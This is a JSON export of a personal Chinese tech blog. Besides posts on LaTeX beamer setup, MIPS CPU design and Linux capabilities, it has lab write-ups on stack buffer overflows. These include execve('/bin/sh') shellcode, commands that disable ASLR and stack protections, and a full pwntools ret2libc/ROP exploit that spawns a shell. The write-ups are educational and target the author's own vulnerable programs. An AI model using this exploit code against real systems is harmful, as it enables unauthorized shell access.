{"meta":{"title":"Xsyin's Blog","subtitle":null,"description":"既然选择了远方，便只顾风雨兼程","author":"Xsyin","url":"https://xsyin.github.io"},"pages":[{"title":"关于","date":"2018-04-30T11:31:13.000Z","updated":"2018-05-10T08:57:06.993Z","comments":false,"path":"about/index.html","permalink":"https://xsyin.github.io/about/index.html","excerpt":"","text":"​ 研究生一枚，正在科研路上搬砖，写写博客将自己觉得有意义的东西放上来，免得哪天找不到～"},{"title":"categories","date":"2018-04-30T10:05:10.000Z","updated":"2018-04-30T10:06:04.766Z","comments":false,"path":"categories/index.html","permalink":"https://xsyin.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-04-30T10:01:45.000Z","updated":"2018-04-30T10:03:23.485Z","comments":false,"path":"tags/index.html","permalink":"https://xsyin.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"永远的Hello World","slug":"hello-world","date":"2018-10-24T09:07:23.525Z","updated":"2018-04-30T16:33:24.641Z","comments":true,"path":"2018/10/24/hello-world/","link":"","permalink":"https://xsyin.github.io/2018/10/24/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"ubuntu搭建TexLive环境写slide","slug":"ubuntu搭建TexLive环境写slide","date":"2018-05-07T23:03:40.000Z","updated":"2018-05-07T23:03:40.000Z","comments":true,"path":"2018/05/08/ubuntu搭建TexLive环境写slide/","link":"","permalink":"https://xsyin.github.io/2018/05/08/ubuntu搭建TexLive环境写slide/","excerpt":"前言 想做ppt，但几次ppt演示时出现兼容问题，于是想尝试格式稳定的beamer 做ppt 。 本机空间不足，apt-get install 命令无法指定安装路径，于是挂载了一个硬盘，手动下载后安装，空间充足可sudo apt install texlive-full texstudio 一行命令解决。 texlive安装 进入准备安装路径，使用更快的清华大学镜像源下载texlive 安装包：","text":"前言 想做ppt，但几次ppt演示时出现兼容问题，于是想尝试格式稳定的beamer 做ppt 。 本机空间不足，apt-get install 命令无法指定安装路径，于是挂载了一个硬盘，手动下载后安装，空间充足可sudo apt install texlive-full texstudio 一行命令解决。 texlive安装 进入准备安装路径，使用更快的清华大学镜像源下载texlive 安装包： 12$ cd /media/xsyin/extra$ wget https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/texlive2018.iso 单击挂载光盘，用浏览器打开主目录下的index.html ，找到tex Live安装指南 ，或阅读网络版TEX Live安装指南 。使用图形化安装，安装依赖： 12$ sudo apt install perl-tk$ ./install-tl -gui=perltk Installation collections --&gt; change 选择安装模块，去除一些用不着的语言Cyrillic 至Spanish ，选上US and UK English ： TEXDIR --&gt;change 修改为安装路径：/media/xsyin/extra/texlive2018 ，其余默认，开始安装。 配置环境变量，编辑~/.bashrc， 添加： 123export PATH=$PATH:/media/xsyin/extra/texlive2018/bin/x86_64-linuxexport MANPATH=/media/xsyin/extra/texlive2018/texmf-dist/doc/man:$MANPATHexport INFOPATH=/media/xsyin/extra/texlive2018/texmf-dist/doc/info:$INFOPATH source ~/.bashrc 启用配置。 管理你的安装tlmgr ，设置清华大学开源仓库并更新，已安装beamer： 123$ tlmgr option repository https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/tlnet$ tlmgr update -all$ tlmgr info beamer 也可以GUI 模式启动： tlmgr -gui 测试安装是否成功： 123$ tex --version$ latex sample2e.tex$ pdflatex sample2e.tex texstudio安装 texstudio 占用空间不大，使用sudo apt install texstusio 安装或在源码包下载页面 选择对应的安装包，依赖不满足使用sudo apt -f install 安装。 texstudio 打开，配置语言为中文. beamer 快速上手一般采用现成的模板，在texstudio中新建，复制以下最小模板，构建并查看： 123456789101112131415161718192021222324252627282930313233343536373839404142434445%!TEX program = xelatex\\documentclass&#123;beamer&#125;\\usepackage&#123;xeCJK&#125;\\usetheme&#123;Madrid&#125;\\title[标题]&#123;完整标题&#125;\\author[作者]&#123;完整作者&#125;\\institute[单位]&#123;完整单位列表&#125;\\date[日期]&#123;完整日期&#125;\\begin&#123;document&#125;%------------------------------------------------\\begin&#123;frame&#125; \\titlepage\\end&#123;frame&#125;%------------------------------------------------\\begin&#123;frame&#125;&#123;Outline&#125; \\tableofcontents\\end&#123;frame&#125;%------------------------------------------------\\section&#123;背景介绍&#125;\\begin&#123;frame&#125;\\frametitle&#123;中文&#125;\\begin&#123;block&#125;&#123;模块&#125;内容 \\begin&#123;itemize&#125; \\item 条目1 \\end&#123;itemize&#125;\\end&#123;block&#125;\\end&#123;frame&#125;%------------------------------------------------\\end&#123;document&#125; 好了，现在可以开(ku) 心(bi)的写slide 了。 参考资料Beamer 显示中文的模板","categories":[{"name":"tex","slug":"tex","permalink":"https://xsyin.github.io/categories/tex/"}],"tags":[{"name":"tex","slug":"tex","permalink":"https://xsyin.github.io/tags/tex/"}]},{"title":"栈溢出","slug":"栈溢出","date":"2018-05-06T11:34:43.000Z","updated":"2018-05-06T11:34:43.000Z","comments":true,"path":"2018/05/06/栈溢出/","link":"","permalink":"https://xsyin.github.io/2018/05/06/栈溢出/","excerpt":"基于64位ubuntu 16.04操作系统版本以及gcc,gdb版本如下： Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609 GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1","text":"基于64位ubuntu 16.04操作系统版本以及gcc,gdb版本如下： Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609 GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1 ###准备工作 为了更简单的方式实现栈溢出，需要关闭一些保护措施。 关闭ASLR(地址空间布局随机化): 1echo 0 |sudo tee /proc/sys/kernel/randomize_va_space Cannary:开启Cannary之后，函数开始时在rbp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用__stackchk_fail函数，终止进程。对应GCC编译选项-fno-stack-protector解除该保护。 NX:开启NX保护后，程序的堆栈将会不可执行，对应GCC编译选项-z execstack解除该保护。 C语言栈帧结构如下： 漏洞程序123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;FILE* g_fp; void read_file()&#123; char buf[100]; int v,length=0; g_fp=fopen(\"../input/buffer_overflow_code_injection_write_file.txt\",\"r\"); if(g_fp==NULL) &#123; printf(\"open file failed!\\n\"); exit(1); &#125; while (fscanf(g_fp, \"\\\\x%02x\", &amp;v) == 1) &#123; buf[length++] = v; &#125; fclose(g_fp);&#125;int main(int argc,char *argv[])&#123; read_file(); return 0;&#125; 分析 分析漏洞代码， while循环出现栈溢出，读入文件中覆盖了rbp与返回地址，且修改其指向shellcode起始指令； 分析读入文件，即将返回地址处修改为shellcode首地址 编译： 1gcc -g -z execstack -fno-stack-protector buffer_overflow_code_injection_write_file.c -o buffer_overflow 运行 使用gdb调试运行：gdb buffer_overflow ​ 由调试可知栈帧结构如图所示，因此栈溢出时会覆盖length值，即100后有覆盖为97,最终读入0x6d即109，刚好从rbp指向地址开始填充之后的8个0x61，之后填充返回地址，由图中分析可知该返回地址应改为0x00007fffffffdab0，小端模式，读入文件中\\x20\\x18改为\\xb0\\xda。重新调试： 成功跳入shellcode，继续运行： 正常退出，此时output文件夹已生成新文件： 在gdb调试环境下运行成功，但实际运行却出现段错误： 改进​ 经搜索查阅资料得知是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。 要获取shellcode首条指令的地址，可以在程序中打印出length的地址加上4(length)+8(rbp)+8(返回地址)=20,也可以利用内核转储获取真实地址。 首先启用内核转储：ulimit -c unlimited，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。 由图中可知应把读入文件返回地址处改为：\\x40\\xdb\\xff\\xff\\xff\\x7f\\x00\\x00，再次运行： 正常环境下运行成功。 总结复现关键点： 关闭保护措施 找准rbp后保存返回地址的8个字节 确定shellcode的入口地址","categories":[{"name":"安全","slug":"安全","permalink":"https://xsyin.github.io/categories/安全/"}],"tags":[{"name":"栈溢出","slug":"栈溢出","permalink":"https://xsyin.github.io/tags/栈溢出/"},{"name":"安全","slug":"安全","permalink":"https://xsyin.github.io/tags/安全/"}]},{"title":"高级栈溢出及ret2libc","slug":"高级栈溢出及ret2libc","date":"2018-05-05T01:38:08.000Z","updated":"2018-05-05T01:38:08.000Z","comments":true,"path":"2018/05/05/高级栈溢出及ret2libc/","link":"","permalink":"https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/","excerpt":"准备工作 实验环境：uname -a 64位 ubuntu 16.04 Linux ubuntu 4.4.0-122-generic #146-Ubuntu SMP Mon Apr 23 15:34:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux gdb-peda 12$ git clone https://github.com/longld/peda.git ~/peda$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit pwntools 1$ pip install pwn","text":"准备工作 实验环境：uname -a 64位 ubuntu 16.04 Linux ubuntu 4.4.0-122-generic #146-Ubuntu SMP Mon Apr 23 15:34:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux gdb-peda 12$ git clone https://github.com/longld/peda.git ~/peda$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit pwntools 1$ pip install pwn 三种保护机制 ASLR ：地址空间随机化，每次运行函数地址改变。 ​ 绕过：随机化只是将每次库函数加载地址随机，库函数间相对地址不变，因此通过GOT来泄漏库函数地址， 以推导出libc中其他函数（如system）的地址。 NX ：通过在页表上设置NX(不可执行）位，将非代码段的地址空间设置成不可执行属性，一旦系统从这些地址空间进行取指令时，CPU就是报内存违例异常，进而杀死进程。栈空间也被操作系统设置了不可执行属性，因此普通的shellode注入无法执行。 ​ 绕过：ret2libc 利用已有代码，更改返回地址时返回到系统函数。 Cannary ： 通过在缓冲区和返回地址间插入一个canary word ，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击。 ​ 暂时未研究如何绕过，因此使用-fno-stack-protector 标志关闭该安全保护机制。 ret2libc难点： 由于ASLR机制，需要泄漏库函数地址以确定system 函数地址，本次结合ROP 使用write 函数获取write 函数实际地址。 由于操作环境为64位linux ，函数通过rdi,rsi,rdx,rcx,r8,r9 以及栈传参，因此采用pop,ret 片段装填参数 ​ 本次实验结合了ret2libc 与ROP 两种手段，为简化操作，内置了需要的gadget 。 漏洞程序1234567891011121314151617181920212223242526272829/************************************************************************* &gt; File Name: vuln.c &gt; Author: xsyin &gt; Mail: shouyinXu@163.com &gt; Created Time: 2018年05月05日 星期六 14时24分14秒 &gt; Make: gcc -fno-stack-protector -g vuln.c -o vuln ************************************************************************/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;void helper()&#123; asm(\"pop %rdi; pop %rsi; pop %rdx; ret\");&#125;void vuln()&#123; char buf[128]; memset(buf,0,128); write(STDOUT_FILENO, \"Enter input: \\n\",14); read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char const *argv[])&#123; vuln(); return 0;&#125; read 函数中允许写入521字节到一个只有128字节的缓冲区，明显的缓冲区溢出利用点。 寻找溢出点 溢出点在偏移136处，即buf 填充136之后为返回地址。 寻找需要的gadget 片段 构造payload ： 12345678#payload1 获取write函数实际地址payload1 = &quot;A&quot; * 136 #截至返回地址前的缓冲区长度payload1 += p64(pppr) #跳转到PPPR指令序列，为write函数赋值payload1 += p64(0x1) #write函数的第一个参数，1表示输出到stdoutpayload1 += p64(got_write) #write函数的第二个参数，表示要输出字符串的首地址payload1 += p64(0x8) #write函数的第三个参数，表示要输出字符串的长度payload1 += p64(plt_write) #调用write函数payload1 += p64(vuln) #继续调用vuln函数 由于linux 共享库的延迟绑定技术，函数第一次调用时填充GOT表，在运行到read 函数时write 函数GOT 表中已填入实际地址。payload1 读取该地址。 12345#payload2 跳转至库函数systempayload2 = &quot;A&quot; * 136 #截至返回地址前的缓冲区长度payload2 += p64(pr) #跳转到PR指令序列，填充system的第一个参数payload2 += p64(binsh_addr) #system函数的第一个参数/bin/shpayload2 += p64(systemAddr) #调用system函数 结果 退出报错，可以通过PPPR片段再次跳转到exit 函数正常退出。 总结 优点： 通过ret2libc 与 ROP 绕过了ASLR与NX机制 缺点： 未绕过GS机制，可通过更改__stackchk_fail__函数GOT 表项 内置了需要的gadget ，可使用通用的片段，ret2csu 需要知道 libc 路径及版本，可通过pwntools提供的DynELF模块来进行内存搜索 利用程序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/python# -*- coding:utf-8 -*-# file: exploit.pyfrom pwn import *import structelf = ELF('vuln')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')p = process('./vuln')pppr = 0x4005bapr = 0x400693plt_write = elf.symbols['write']got_write = elf.got['write']libc_write = libc.symbols['write']libc_system = libc.symbols['system']print \"libc_system: \"+hex(libc_system)vuln = elf.symbols['vuln']payload1 = \"A\" * 136payload1 += p64(pppr)payload1 += p64(0x1)payload1 += p64(got_write)payload1 += p64(0x8)payload1 += p64(plt_write)payload1 += p64(vuln)p.recvuntil(\"Enter input:\")print \"################ send payload1 ###########\"p.send(payload1)p.recv(8)writeAddrTmp = struct.unpack('&lt;Q', p.recv(8)[-8::])writeAddr = writeAddrTmp[0]print \"writeAddr:\", hex(writeAddr)systemAddr = (writeAddr - libc_write) + libc_systemprint \"systemAddr:\", hex(systemAddr)binsh_addr = (writeAddr - libc_write) + next(libc.search('/bin/sh'))print \"binsh_addr:\", hex(binsh_addr)payload2 = \"A\" * 136payload2 += p64(pr)payload2 += p64(binsh_addr)payload2 += p64(systemAddr)p.recvuntil(\"Enter input:\")print \"################ send payload2 ###########\"p.send(payload2)p.interactive() 参考资料一步一步学ROP之linux_x64篇","categories":[{"name":"安全","slug":"安全","permalink":"https://xsyin.github.io/categories/安全/"}],"tags":[{"name":"栈溢出","slug":"栈溢出","permalink":"https://xsyin.github.io/tags/栈溢出/"},{"name":"安全","slug":"安全","permalink":"https://xsyin.github.io/tags/安全/"}]},{"title":"MIPS CPU单周期设计","slug":"MIPS-CPU单周期设计","date":"2018-05-03T01:17:50.000Z","updated":"2018-05-03T01:17:50.000Z","comments":true,"path":"2018/05/03/MIPS-CPU单周期设计/","link":"","permalink":"https://xsyin.github.io/2018/05/03/MIPS-CPU单周期设计/","excerpt":"本设计为计算机系统结构实验，写此文仅为总结。 1.准备工作 安装Xilinx ISE Design Suite 14.7 本设计使用Verilog HDL硬件描述语言，需熟悉其基本语法。","text":"本设计为计算机系统结构实验，写此文仅为总结。 1.准备工作 安装Xilinx ISE Design Suite 14.7 本设计使用Verilog HDL硬件描述语言，需熟悉其基本语法。 2.设计总体要求(1)概述单周期（Single Cycle）CPU是指CPU从取出1条指令到执行完该指令只需1个时钟周期。一条指令的执行过程包括：取指令→分析指令→执行指令→保存结果（如果有的话）。对于单周期CPU来说，这些执行步骤均在一个时钟周期内完成。 (2)设计实现电路 (3)实现指令集MIPS指令系统结构有MIPS-32和MIPS-64两种。本实验的MIPS指令选用MIPS-32。以下所说的MIPS指令均指MIPS-32。MIPS的指令格式为32位。图3-3给出了MIPS指令的3种格式。 本实验只选取了18条典型的MIPS指令来描述CPU逻辑电路的设计方法。表3-1列出了本实验的所涉及到的18条MIPS指令。Op和Op2为操作码；shift保存要移位的位数；rd、rs、rt分别为寄存器的寄存器号；immediate保存立即数的低16位；offset为偏移量；address为转移地址的一部分。 1、对于add/sub/mul/and/or/xor rd,rs,rt指令 //rdrs op rt其中rs和rt是两个源操作数的寄存器号，rd是目的寄存器号。 2、对于sll/srl/sra rd,rt,shift 指令 //rdrt 移动 shift位 3、对于addi/muli rt,rs,imm 指令 //rtrs+imm(符号拓展)rt是目的寄存器号，立即数要做符号拓展到32位。 4、对于andi/ori/xori rt,rs,imm 指令 //rtrs op imm(零拓展)因为是逻辑指令，所以是零拓展。 5、对于load rt,offset(rs) 指令 //rt memory[rs+offset]load是一条取存储器字的指令。寄存器rs的内容与符号拓展的offset想加，得到存储器地址。从存储器取来的数据存入rt寄存器。 6、对于store rt,offset(rs) 指令 // memory[rs+offset]  rtstore是一条存字指令。存储器地址的计算方法与load相同。 7、对于beq rs,rt,label指令 //if(rs==rt) PClabelbeq是一条条件转移指令。当寄存器rs内容与rt相等时，转移到label。如果程序计数器PC是beq的指令地址，则label=PC+4+offset&lt;&lt;2。offset左移两位导致PC的最低两位永远是0，这是因为PC是字节地址，而一条指令要占4个字节。offset要进行符号拓展，因为beq能实现向前和向后两种转移。 8、bne指令去beq类似，但是是在寄存器rs内容与rt不相等时，转移到label。 9、对于jump target指令 //PCtargetjump是一条跳转指令。target是转移的目标地址，32位，由3部分组成：最高4位来自于PC+4的高4位，中间26位是指令中的address，最低两位为0。 ————————————————————— 未完待续—————————————————————————–","categories":[{"name":"CPU","slug":"CPU","permalink":"https://xsyin.github.io/categories/CPU/"}],"tags":[{"name":"MIPS","slug":"MIPS","permalink":"https://xsyin.github.io/tags/MIPS/"},{"name":"CPU","slug":"CPU","permalink":"https://xsyin.github.io/tags/CPU/"}]},{"title":"基础栈溢出","slug":"基础栈溢出","date":"2018-05-01T02:53:54.000Z","updated":"2018-05-01T02:53:54.000Z","comments":true,"path":"2018/05/01/基础栈溢出/","link":"","permalink":"https://xsyin.github.io/2018/05/01/基础栈溢出/","excerpt":"目的 理解掌握C 栈帧结构 Shellcode 构造 加深理解栈溢出攻击原理及防护措施 要求 在关闭安全机制下,在Linux系统平台上实现缓冲区溢出攻击 开启安全保护机制,运行一样的溢出攻击代码,比较实现现象","text":"目的 理解掌握C 栈帧结构 Shellcode 构造 加深理解栈溢出攻击原理及防护措施 要求 在关闭安全机制下,在Linux系统平台上实现缓冲区溢出攻击 开启安全保护机制,运行一样的溢出攻击代码,比较实现现象 实例​ C 栈帧结构如下： ​ 因此当当前帧的局部变量和临时变量超出区域，覆盖了ebp 和返回地址时，就实现了栈溢出攻击。再通过精心设计返回地址，使其为Shellcode 的起始地址，就完成了运行流的劫持。 ​ 实例基于 64位 Ubuntu \\ 16.04 操作系统版本以及 gcc,gdb 版本信息如下： 12345Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linuxgcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1 Shellcode 代码 ​ Shellcode 是一段攻击者精心设计的恶意代码，通常要求与位置无关，且本实验中利用 strcpy() 函数，因此Shellcode 代码中不能出现 \\x00 ，会被当作\\0从而结束拷贝。 ​ 编写Shellcode ，该shellcode 调用execve(&quot;/bin/sh&quot;,NULL) ，启动一个新的shell，验证其功能，参考: https://www.exploit-db.com/exploits/36858/ ，编写汇编文件如下： 1234567891011121314151617181920212223.global _start_start: # char *const argv[] xorl %esi, %esi # &apos;h&apos; &apos;s&apos; &apos;/&apos; &apos;/&apos; &apos;n&apos; &apos;i&apos; &apos;b&apos; &apos;/&apos; movq `0x68732f2f6e69622f, %rbx # for &apos;\\x00&apos; pushq %rsi pushq %rbx pushq %rsp # const char *filename popq %rdi # __NR_execve 59 pushq `59 popq %rax # char *const envp[] xorl %edx, %edx syscall 提取机器码： 漏洞代码 123456789101112#include &lt;stdio.h&gt;#include &lt;string.h&gt;void overflow(char* str)&#123; char buf[30]; strcpy(buf, str);&#125;int main()&#123; char str[60]=\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\" \"\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"; overflow(str); return 0;&#125; ​ 上面这段程序栈溢出漏洞触发点在strcpy函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址。因此在gdb调试时确定shellcode的地址即str复制后buf的首地址，让返回地址指向该地址。 结果 ​ 为了更简单的方式实现栈溢出，需要关闭一些保护措施。 ASLR (地址空间布局随机化) 关闭ASLR：echo 0 |sudo tee /proc/sys/kernel/randomize_va_space Cannary 金丝雀 开启Canary之后，函数开始时在ebp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用 _stackchk_fail函数，终止进程。对应GCC编译选项-fno-stack-protector解除该保护。 NX开启NX保护之后，程序的堆栈将会不可执行。对应GCC编译选项-z execstack解除该保护。 编译调试： ​ 从调试结果可知，buf 的首地址为 0x7fffffffdaa0 ，且查看内存该地址处确实为 Shellcode 起始代码。为了覆盖到返回地址，即填充字节至且包括8字节rbp (0x7fffffffdac0) ，则除了shellcode外还需要填充17字节。另外返回地址为0x7fffffffdaa0,改为小端模式\\xa0\\xda\\xff\\xff\\xff\\x7f。因此： 1234char str[60]=\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\" \"\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\" \"\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\\x61\" \"\\xa0\\xda\\xff\\xff\\xff\\x7f\\x00\\x00\"; ​ 重新编译，gdb调试运行： 成功运行。然而实际运行却是段错误，原因是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。 获取shellcode 实际地址，可以打印出buf 地址，也可以利用内核转储获取真实地址。首先启用内核转储 ulimit -c unlimited ，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。 因此修改str 尾部为\\x10\\xdb\\xff\\xff\\xff\\x7f\\x00\\x00。重新编译运行： 若启用保护措施，正常编译：","categories":[{"name":"安全","slug":"安全","permalink":"https://xsyin.github.io/categories/安全/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://xsyin.github.io/tags/Linux/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://xsyin.github.io/tags/栈溢出/"}]},{"title":"Linux 权能机制","slug":"Linux-权能机制","date":"2018-05-01T02:20:22.000Z","updated":"2018-05-01T02:20:22.000Z","comments":true,"path":"2018/05/01/Linux-权能机制/","link":"","permalink":"https://xsyin.github.io/2018/05/01/Linux-权能机制/","excerpt":"passwd​ ， sudo​ ， ping​ 等命令会修改关键文件，确保非root​ 用户无法修改，因此需要转换为root​ 用户，而setuid​ 位可以让用户暂时获得文件拥有者root​ 的身份。 以ping 命令为例，删除s 位后无法ping ，因为没有打开socket 的权限。而当将s 位重新设置时，又可以ping ：","text":"passwd​ ， sudo​ ， ping​ 等命令会修改关键文件，确保非root​ 用户无法修改，因此需要转换为root​ 用户，而setuid​ 位可以让用户暂时获得文件拥有者root​ 的身份。 以ping 命令为例，删除s 位后无法ping ，因为没有打开socket 的权限。而当将s 位重新设置时，又可以ping ： 为了执行权限检查，传统的 UNIX 实现区分两种类型的进程：特权进程（其有效用户 ID 为0，称为超级用户或 root），和非特权用户（其有效 UID 非0）。特权进程绕过所有的内核权限检查，而非特权进程受基于进程的认证信息（通常是：有效 UID，有效 GID，和补充组列表）的完整权限检查的支配。 自内核 2.2 版本开始，Linux 将传统上与超级用户关联的特权分为几个单元，称为 capabilities （权能），它们可以被独立的启用或禁用。权能是每个线程的属性。权能相当于规范了你这个程序所拥有的权限。相当于特权的需求的细化。当执行特权操作的时候，可以查看是否有相应的权能。 ping 命令需要CAP_NET_RAW的权能，使用setcap为其添加权能： 可以ping ，且没有设置uid 位。 使用man capabilities 可以查看权能列表及相应的解释： CAP_AUDIT_CONTROL（自 Linux 2.6.11）启用和禁用内核审计；修改审计过滤器规则；提取审计状态和过滤规则。 CAP_AUDIT_READ（自 Linux 3.16）允许通过一个多播 netlink socket 读取审计日志。 CAP_AUDIT_WRITE（自 Linux 2.6.11）向内核审计日志写记录。 CAP_BLOCK_SUSPEND（自 Linux 3.5）可以阻塞系统挂起（epoll(7) EPOLLWAKEUP，/proc/sys/wake_lock）的特性。 CAP_CHOWN对文件的 UIDs 和 GIDs 做任意的修改（参考 chown(2)）。 CAP_DAC_OVERRIDE绕过文件的读，写，和执行权限检查。（DAC 是 “discretionary access control” 的缩写。） CAP_DAC_READ_SEARCH 绕过文件的读权限检查和目录的读和执行权限检查； 调用 open_by_handle_at(2)。 CAP_FOWNER 对于通常要求进程的文件系统 UID 与文件的 UID 匹配的操作，绕过权限检查 (比如，chmod(2)，utime(2))，除了那些包含在 CAP_DAC_OVERRIDE 和 CAP_DAC_READ_SEARCH 中的操作； 为任意文件设置扩展文件属性(参考 chattr(1))； 为任意文件设置访问控制表(ACLs)； 对文件删除操作忽略目录的 sticky 位； 在 open(2) 和 fcntl(2) 任意文件时设置 O_NOATIME。 CAP_FSETID当文件修改时不清除 set-user-ID 和 set-group-ID 模式位；为文件 GID 与调用进程的文件系统或补充 GIDs 不匹配的文件设置 set-group-ID 位。 CAP_IPC_LOCK锁定内存 (mlock(2)，mlockall(2)，mmap(2)，shmctl(2))。 CAP_IPC_OWNER绕过对 System V IPC 对象的操作的权限检查。 CAP_KILL绕过发送信号 (参考 kill(2)) 时的权限检查。这包括使用 ioctl(2) KDSIGACCEPT 操作。 CAP_LEASE（自 Linux 2.4）为任意文件建立租约 (参考 fcntl(2))。 CAP_LINUX_IMMUTABLE设置FS_APPEND_FL 和 FS_IMMUTABLE_FL inode 标记 (参考 chattr(1))。 CAP_MAC_ADMIN（自 Linux 2.6.25）覆盖强制访问控制 (Mandatory Access Control (MAC)). 为 Smack Linux 安全模块(Linux Security Module (LSM)) 而实现。 CAP_MAC_OVERRIDE（自 Linux 2.6.25）允许 MAC 配置或状态改变。为 Smack LSM 而实现。 CAP_MKNOD（自 Linux 2.4）使用 mknod(2) 创建特殊文件。 CAP_NET_ADMIN 执行多种网络有关的操作： 接口配置； IP 防火墙，地址伪装，和账单管理； 修改路由表； 为透明代理绑定任何地址； 设置服务类性 (type-of-service (TOS))； 清理驱动统计资料； 设置混杂模式； 启用组播； 使用 setsockopt(2) 设置下列 socket 选项：SO_DEBUG，SO_MARK，SO_PRIORITY (在0到6范围之外的优先级)，SO_RCVBUFFORCE，和 SO_SNDBUFFORCE。 CAP_NET_BIND_SERVICE将一个 socket 绑定到一个互联网域特权端口 (端口号小于 1024)。 CAP_NET_BROADCAST(未使用) 使 socket 发送组播，并监听组播。 CAP_NET_RAW 使用 RAW 和 PACKET sockets； 为透明代理绑定任何地址。 CAP_SETGID执行任意的进程 GIDs 和补充 GID 列表管理；当通过 UNIX 域 sockets 传递 socket 认证信息时伪造 GID；在一个用户命名空间 (参考 user_namespaces(7)) 中写入组 ID 映射。 CAP_SETFCAP (since Linux 2.6.24)设置文件的权能。 CAP_SETPCAP 如果文件权能不受支持：授予或删除调用者功能设置位或来自任何其他进程的任何权能。 （当内核配置为支持文件功能时，CAP_SETPCAP的此属性不可用，因为CAP_SETPCAP对于这样的内核具有完全不同的语义。） 如果支持文件权能：从调用线程的边界集中添加任意权能到其可继承位;从边界集中删除权能（通过prctl（2）PR_CAPBSET_DROP）; 对securebits标志进行更改。 CAP_SETUID CAP_SYS_ADMIN 执行一系列系统管理操作，包括：quotactl(2)，mount(2)，umount(2)，swapon(2)，swapoff(2)，sethostname(2)，和 setdomainname(2)； 执行特权 syslog(2) 操作 (自 Linux 2.6.37 开始，应该使用 CAP_SYSLOG 来允许这一操作)； 执行 VM86_REQUEST_IRQ vm86(2) 命令； 对任意 System V IPC 对象执行 IPC_SET 和 IPC_RMID 操作； 覆盖 RLIMIT_NPROC 资源限制； 执行 trusted 和 security Extended Attributes (see xattr(7)) 操作； 使用 lookup_dcookie(2)； 使用 ioprio_set(2) 来分配 IOPRIO_CLASS_RT 和 (Linux 2.6.25 之前) IOPRIO_CLASS_IDLE I/O 调度类别； 当通过 UNIX 域 sockets 传递 socket 认证信息时伪装 PID； 在系统调用打开文件 (比如，accept(2)，execve(2)，open(2)，pipe(2)) 时，超出 /proc/sys/fs/file-max，系统范围内打开文件数的限制； 通过 clone(2) 和 unshare(2) 使用 CLONE_* 标记创建新的命名空间（但是，自从 Linux 3.8 开始，创建命名空间不需要任何权能）； 调用 perf_event_open(2)； 访问特权 perf 事件信息； 调用 setns(2) (在目标命名空间中需要 CAP_SYS_ADMIN)； 调用 fanotify_init(2)； 调用 bpf(2)； 执行 KEYCTL_CHOWN 和 KEYCTL_SETPERM keyctl(2) 操作； 执行 madvise(2) MADV_HWPOISON 操作； 使用 TIOCSTI ioctl(2) 向一个终端的输入队列中插入字符，而不是调用者的控制终端； 使用废弃的 nfsservctl (2) 系统调用； 使用废弃的 bdflush (2) 系统调用； 执行各种特权的块设备 ioctl(2) 操作； 执行各种特权的文件系统 ioctl(2) 操作； 对许多设备驱动执行管理操作。 CAP_SYS_BOOT使用 